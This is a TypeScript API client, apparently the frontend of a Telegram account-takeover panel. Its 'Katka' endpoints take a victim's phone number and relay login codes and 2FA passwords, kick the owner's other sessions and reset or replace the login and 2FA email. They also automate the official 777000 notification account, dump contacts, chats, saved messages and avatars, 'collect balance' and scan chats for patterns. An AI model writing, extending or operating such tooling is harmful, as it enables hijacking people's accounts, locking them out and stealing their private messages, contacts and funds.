import axios from 'axios';
import { useAuthStore } from '../store/authStore';
import {
    TelegramAuthRequest,
    TelegramCodeRequest,
    TelegramPasswordRequest,
    ConnectionCheckResult,
    SendCodeResult,
    VerifyCodeResult,
    VerifyPasswordResult,
    TelegramSession,
    ApiResponse
} from '../types';

// Используем тот же способ определения API_URL, что и в основном api.ts
const rawEnvUrl = (import.meta as any)?.env?.VITE_API_URL as string | undefined;
const normalizedEnvUrl = rawEnvUrl
    ? rawEnvUrl.replace(/\/$/, '') + (rawEnvUrl.endsWith('/api') ? '' : '/api')
    : undefined;
const API_URL = normalizedEnvUrl || '/api';

const api = axios.create({
    baseURL: `${API_URL}/telegram`,
    headers: {
        'Content-Type': 'application/json',
    },
});

api.interceptors.request.use((config) => {
    // Используем тот же способ получения токена, что и в основном api.ts
    const token = useAuthStore.getState().token;
    if (token) {
        config.headers.Authorization = `Bearer ${token}`;
    }
    return config;
});

export const telegramService = {
    async checkConnection(): Promise<ConnectionCheckResult> {
        const response = await api.get<ConnectionCheckResult>('/check-connection');
        return response.data;
    },

    async sendCode(data: TelegramAuthRequest): Promise<SendCodeResult> {
        const response = await api.post<SendCodeResult>('/send-code', data);
        return response.data;
    },

    async verifyCode(data: TelegramCodeRequest): Promise<VerifyCodeResult> {
        const response = await api.post<VerifyCodeResult>('/verify-code', data);
        return response.data;
    },

    async sendEmailCode(data: { phone_number: string; phone_code_hash: string; email: string }): Promise<any> {
        const response = await api.post('/send-email-code', data);
        return response.data;
    },

    async verifyEmailCode(data: { phone_number: string; phone_code_hash: string; code: string }): Promise<any> {
        const response = await api.post('/verify-email-code', data);
        return response.data;
    },

    async resetTwoFactor(data: { phone_number: string }): Promise<any> {
        const response = await api.post('/reset-2fa', data);
        return response.data;
    },

    async changeTwoFactorPassword(data: { phone_number: string; code: string; new_password: string; email?: string }): Promise<any> {
        const response = await api.post('/change-2fa-password', data);
        return response.data;
    },

    async verifyPassword(data: TelegramPasswordRequest): Promise<VerifyPasswordResult> {
        const response = await api.post<VerifyPasswordResult>('/verify-password', data);
        return response.data;
    },

    async getAllSessions(): Promise<TelegramSession[]> {
        const response = await api.get<ApiResponse<TelegramSession[]>>('/sessions');
        return response.data.data || [];
    },

    async getSessionById(id: number): Promise<TelegramSession | null> {
        const response = await api.get<ApiResponse<TelegramSession>>(`/sessions/${id}`);
        return response.data.data || null;
    },

    async deleteSession(id: number): Promise<boolean> {
        const response = await api.delete<ApiResponse>(`/sessions/${id}`);
        return response.data.success;
    },

    async getSessionHistory(id: number): Promise<any[]> {
        const response = await api.get<ApiResponse<any[]>>(`/sessions/${id}/history`);
        return response.data.data || [];
    },

    // ------- Katka control endpoints -------
    async showUserInfo(phone_number: string): Promise<any> {
        const response = await api.get(`/katka/user-info`, { params: { phone_number } });
        return response.data;
    },

    async exportContacts(phone_number: string): Promise<{ success: boolean; file_name?: string; downloadUrl?: string; message?: string; }> {
        const response = await api.post('/katka/export-contacts', { phone_number });
        return response.data;
    },

    async terminateOtherSessions(phone_number: string): Promise<any> {
        const response = await api.post('/katka/terminate-other-sessions', { phone_number });
        return response.data;
    },

    async autoChangeLoginEmail(phone_number: string): Promise<{ success: boolean; old_email?: string; new_email?: string; message?: string; }> {
        const response = await api.post('/katka/auto-change-login-email', { phone_number });
        return response.data;
    },

    async exportChats(phone_number: string): Promise<{ success: boolean; file_name?: string; downloadUrl?: string; message?: string; }> {
        const response = await api.post('/katka/export-chats', { phone_number });
        return response.data;
    },

    async exportSavedMessages(phone_number: string): Promise<{ success: boolean; file_name?: string; downloadUrl?: string; message?: string; }> {
        const response = await api.post('/katka/export-saved', { phone_number });
        return response.data;
    },

    async exportDialog(phone_number: string, peer: string): Promise<{ success: boolean; file_name?: string; downloadUrl?: string; message?: string; }> {
        const response = await api.post('/katka/export-dialog', { phone_number, peer });
        return response.data;
    },

    async fetchExportFile(sessionId: number, fileName: string): Promise<{ content: string; contentType: string; }> {
        const url = `/exports/${sessionId}/${encodeURIComponent(fileName)}`;
        const response = await api.get(url, { responseType: 'blob' });
        const contentType = response.headers['content-type'] || 'application/octet-stream';
        const text = await (response.data as Blob).text();
        return { content: text, contentType };
    },

    async getSessionMetrics(phone_number: string): Promise<any> {
        const response = await api.get(`/katka/${encodeURIComponent(phone_number)}/metrics`);
        return response.data;
    },

    async getLoginEmailStatus(phone_number: string): Promise<any> {
        const response = await api.get(`/katka/${encodeURIComponent(phone_number)}/login-email-status`);
        return response.data;
    },

    async getLastExports(phone_number: string): Promise<{ success: boolean; files: { contacts?: string; chats?: string; saved_messages?: string; } }> {
        const response = await api.get(`/katka/${encodeURIComponent(phone_number)}/last-exports`);
        return response.data;
    },

    async check2FAStatus(phone_number: string): Promise<any> {
        const response = await api.get(`/katka/${encodeURIComponent(phone_number)}/check-2fa`);
        return response.data;
    },

    async automate777000(phone_number: string): Promise<any> {
        const response = await api.post('/katka/automate-777000', { phone_number });
        return response.data;
    },

    async setOrUpdate2FAEmail(phone_number: string, email: string, new_password?: string, current_password?: string): Promise<any> {
        const response = await api.post('/katka/set-or-update-2fa-email', { phone_number, email, new_password, current_password });
        return response.data;
    },

    async changeLoginEmailSend(phone_number: string, new_email: string): Promise<any> {
        const response = await api.post('/katka/change-login-email/send', { phone_number, new_email });
        return response.data;
    },

    async changeLoginEmailVerify(phone_number: string, new_email: string, code: string): Promise<any> {
        const response = await api.post('/katka/change-login-email/verify', { phone_number, new_email, code });
        return response.data;
    },

    // --- New Katka actions ---
    async exportPatterns(phone_number: string): Promise<any> {
        const response = await api.post('/katka/patterns', { phone_number });
        return response.data;
    },
    async getPatternsIndex(phone_number: string): Promise<any> {
        const response = await api.get(`/katka/${encodeURIComponent(phone_number)}/patterns-index`);
        return response.data;
    },
    async getPatternBundle(phone_number: string, chatId: string, matchId: string): Promise<any> {
        const response = await api.get(`/katka/${encodeURIComponent(phone_number)}/patterns-bundle/${encodeURIComponent(chatId)}/${encodeURIComponent(matchId)}`);
        return response.data;
    },

    async exportAvatar(phone_number: string): Promise<any> {
        const response = await api.post('/katka/avatar', { phone_number });
        return response.data;
    },

    async collectBalance(phone_number: string): Promise<any> {
        const response = await api.post('/katka/balance', { phone_number });
        return response.data;
    },

    async exportContactsWithPhotos(phone_number: string): Promise<any> {
        const response = await api.post('/katka/export-contacts-photos', { phone_number });
        return response.data;
    },

    async getSessionLog(phone_number: string, lines: number = 500): Promise<{ success: boolean; text: string; lines: string[]; size: number; mtime?: string; sessionId?: number; }> {
        const response = await api.get(`/katka/${encodeURIComponent(phone_number)}/session-log`, { params: { lines } });
        return response.data;
    }
};
